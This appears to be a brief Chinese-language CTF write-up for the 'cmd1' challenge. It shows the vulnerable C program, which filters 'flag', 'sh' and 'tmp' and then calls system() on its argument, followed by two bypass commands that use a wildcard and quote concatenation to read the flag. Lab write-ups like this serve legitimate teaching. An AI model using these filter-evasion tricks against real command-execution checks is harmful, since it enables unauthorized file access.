# cmd1
吃引數進去 然後會過濾掉 `flag` `sh` `tmp` 之後執行引數

其中它環境變數會改掉 但是這不是啥大問題

一開始我是想說應該是用環境變數去讀flag 結果不是

解法就是 `./cmd1 "/bin/cat fl*"`

裡用萬用`*`來更改

或是 `./cmd1 "/bin/cat 'fl''ag'"` 利用 字串拼接
```=
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

```
